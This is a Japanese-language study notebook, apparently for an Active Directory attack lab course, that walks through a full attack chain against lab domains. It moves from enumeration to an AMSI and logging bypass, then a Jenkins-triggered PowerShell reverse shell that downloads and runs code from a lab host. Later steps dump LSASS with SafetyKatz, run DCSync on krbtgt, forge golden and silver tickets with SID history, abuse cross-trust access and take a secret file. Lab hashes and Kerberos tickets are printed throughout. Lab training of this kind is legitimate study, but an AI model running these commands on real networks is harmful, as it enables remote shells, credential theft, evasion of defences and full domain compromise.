# 列挙


## SA
```
ipconfig /all
tasklist /v
net user
netstat -anop tcp
nslookup <IP>
```

## AD-Moduleの使用
```
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll

Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

### User情報
```
Get-ADUser -Filter * 		# 大量の情報が出るので見やすくするため以下コマンドを使用

Get-ADUser -Filter * | Select-Object SamAccountName, Enabled, SID	# 説明も見たいので以下コマンド

Get-ADUser -Filter * -Properties *	# properties引数が無い時より細部が表示

Get-ADUser -Filter * -Properties * | Select-Object SamAccountName, Enabled, SID, Description
```

### Domain情報
```
Get-ADDomain

Get-ADDomain | Format-List PDCEmulator, DomainSID, DNSRoot, NetBIOSName

Get-ADDomainController | Select-Object Name, Domain	# ドメインコントローラー情報

Get-ADTrust -Filter * | Select-Object Target, Direction, TrustType	# 信頼の方向
```

### Forest情報
```
$forest = Get-ADForest

$forest.Domains

$forest.GlobalCatalogs
```

### Group情報
```bash
Get-ADGroup -Filter * | Select-Object SamAccountName, SID, GroupScope

et-ADGroupMember -Identity Administrators | Select Name, ObjectClass	# 以下のエラー発生（カレントドメインはAdminがいるドメインではない）
-----------------------------------------------------------
Get-ADGroupMember : A referral was returned from the server
At line:1 char:1
+ Get-ADGroupMember -Identity Administrators | Select Name, ObjectClass
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (Administrators:ADGroup) [Get-ADGroupMember], ADException
    + FullyQualifiedErrorId : ActiveDirectoryServer:8235,Microsoft.ActiveDirectory.Management.Commands.GetADGroupMember
-----------------------------------------------------------
Get-ADGroupMember -Identity Administrators -Server moneycorp.local | Select Name, ObjectClass	# 認証に失敗してエラーが出る
```

### Computer情報
```
Get-ADComputer -Filter * | Select-Object SamAccountName, Enabled, SID
```

## PowerViewの使用
```bash

. C:\AD\Tools\PowerView.ps1	# PowerViewを読み込む。PowerViewは攻撃に使われるツールとして有名なのでDefenderで検知・ブロックされる

C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat	# AMSI（アンチ・マルウェア・スキャン・インターフェース）をバイパス
```

### PowerViewの読込とユーザー情報
```
. C:\AD\Tools\PowerView.ps1

Get-DomainUser | Select -ExpandProperty SamAccountName	# プロパティの複数取り出し不可
```


## 書き込み権限の悪用
```

Import-Module C:\AD\Tools\PowerHuntShares.psm1		# モジュールのインポート

Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt	#ADMINS$,C$,AIが判明。隠しフォルダでないAIを探す
```
・ブラウザでSMBShareを開きInsecure ACEsを見ればAIフォルダがdcorp-ciにあることが分かる


## dcorp-ciの調査
```bash

nslookup dcorp-ci

nmap 172.16.3.11 -Pn -sV -T4

nmap 172.16.3.11 -p 8080 -Pn -A -T5	# titleからJenkinsが判明
```
・ブラウザでhttp://172.16.3.11:8080にアクセス


====================================================================
# 権限昇格


## PowerUpの使用

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PowerUp.ps1

Invoke-AllChecks

```

## WinPeasの使用(コマンドプロンプトで実行)

```bash
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe	  # -args logで出力したoutput.txtで[Weak Services][AlwaysInstallElevated][Unquoted Paths]を検索するのが手っ取り早い


```
## PrivEscCheckの使用

```bash
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\PrivEscCheck.ps1

Invoke-PrivescCheck			# StatusがVulnerable - Highを探す

```


======================================================================
# ラテラルムーブメント（横移動）


## Jenkinsを使用したdcorp-ciへの移動(P39)LO-5

・JenkinsにアクセスしJoeアカウントを調べる
・managerは悪用できそうな部分なし
・builduserはプロジェクトがあり変更可能なので悪用可能
・次のコマンドをセーブする
```bash
powershell.exe iex (iwr http://172.16.100.48/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.48 -Port 443	# ()内のコマンドをメモリ上で即時実行
```
・HFSを起動しダウンロードさせるファイルを準備
・netcatで接続を待ち受け
・powershellでdcorp-ciセッションが確立される


## dcorp-ciからのdcorp-mgmtアクセス(P48)LO-7

```bash
iex (iwr http://172.16.100.48/sbloggingbypass.txt -UseBasicParsing)	# 拡張ログ（P/S実行内容を記録する監査ログ）をバイパス

iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))	# Defenderで検知ブロックされる(メモリ内実行)

・iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.48/PowerView.ps1'))を再度実行
Find-DomainUserLocation		# どの端末にDAがいるか調べるコマンド。数分かかる

winrs -r:dcorp-mgmt cmd /c "set computername && set username"	# winrsが有効か＆コマンド実行の可否を調べる

```

## dcorp-mgmtからクレデンシャル窃取(P49)LO-7

```bash
iwr http://172.16.100.48/Loader.exe -OutFile C:\Users\Public\Loader.exe		# Loader.exeをダウンロード。Loader.exeはローダー実行ファイル

echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe	# Loader.exeをターゲット(dcorp-mgmt)に配送

$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"	# $nullは外部コマンド実行時の起動バナー等不要表示を出力しないようにするためにつけている。

$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"	# SafetyKatzスクリプトをロードしメモリ上で実行。LSASSからKeroberos復号キー取得

```

## クレデンシャルを使用しdcorp-dcにアクセス

・新しいコマンドプロンプトを開始
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
・管理者権限が必要と怒られるので管理者で実行する
・新しいプロンプト画面が表示される
```bash
winrs -r:dcorp-dc cmd /c set username USERNAME=svcadmin
```
・何も表示されない場合コマンド実行は成功しているが表示に不具合がある
・winrs -r:dcorp-dc cmdで接続できることを確認。見事DCまで侵入できた。


===============================================================================
# 永続化


## 秘密の抽出(P62)LO-8

・管理者としてコマンドプロンプトを起動
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt	# DA権限を持つプロンプトが起動

echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y	# Loaderをdcに配置

winrs -r:dcorp-dc cmd		# dcに接続

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48	# ポートフォワード設定

C:\Users\Public\Loader.exe --obfuscate false -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"	# 文字化けが発生するときはHFSを起動していないか学生VMのファイアーウォールがONになっている。
```
・秘密情報を入手
　悪用シナリオ	①他端末の認証に使用（pass the hash） ②NTLMリレー　③パスワードクラック（John）


## ゴールデンチケット攻撃(P63)LO-8
・DA権限を持つプロンプトに移動
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"		# DCSync攻撃でkrbtgtのハッシュを取得

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd	# ゴールデンチケット偽装（AES256は直前のDCSyncで入手）※変な表示が出るときは再ログインする（チケットが多すぎることによるエラー）

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local AlteredSecurity Attacking and Defending Active Directory 65 /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt	# 表示されたコマンドに-path C:\AD\Tools\Rubeus.exe -argsと/pttを追記している

winrs -r:dcorp-dc cmd

set username

set computername

```



## シルバーチケット攻撃
## ダイアモンドチケット攻撃
## エージェント型ならスケジュールタスク、レジストリ実行キー、スタートアップフォルダ、COMオブジェクトがある。


================================================================================
# ドメイン権限昇格(EnterpriseAdmin)


## DomainTrustKeyを使用した権限昇格（P97）LO-18

(DA権限を持つプロンプトが起動していれば以下コマンドは省略可能)
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
・新しいプロンプトが開く
```bash
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y		# Loaderを配置

winrs -r:dcorp-dc cmd	# DCに接続

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48	# ポートフォワード追加

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"		# rc4のハッシュを取得
```
・新しいコマンドプロンプト画面を起動する
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:bf829c994cc5f43fcbc870c9654bc9d5 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap	# SIDヒストリを含むチケットを作成


C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket: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		# 使用しているRC4に間違いがないのにKRBERROR(31)が発生する場合はメールする。

winrs -r:mcorp-dc.moneycorp.local cmd

set username

set computername

```

## krbtgtハッシュ（RC4）を使用した権限昇格（P100）LO-19

(DA権限を持つプロンプトが起動していれば以下コマンドは省略可能.AES256ハッシュはDCSync攻撃で入手)

```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt

winrs -r:mcorp-dc.moneycorp.local cmd

set username

set computername
```
・追加でDCSync攻撃をする場合は以下のコマンド
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
・全ハッシュ入手！

```

## 外部信頼を悪用(P101)LO-20

・管理者権限でコマンドプロンプトを起動
・(DA権限を持つプロンプトが起動していれば以下コマンドは省略可能)
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt


echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

winrs -r:dcorp-dc cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:5c83b026f7591aec55034cb8bd50b496 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket: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		# 使用しているRC4に間違いがないのにKRBERROR(31)が発生する場合はメールする。

dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\	# 外部信頼ドメインの共有リソースにアクセス

type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt	# secret.txtの情報窃取
```
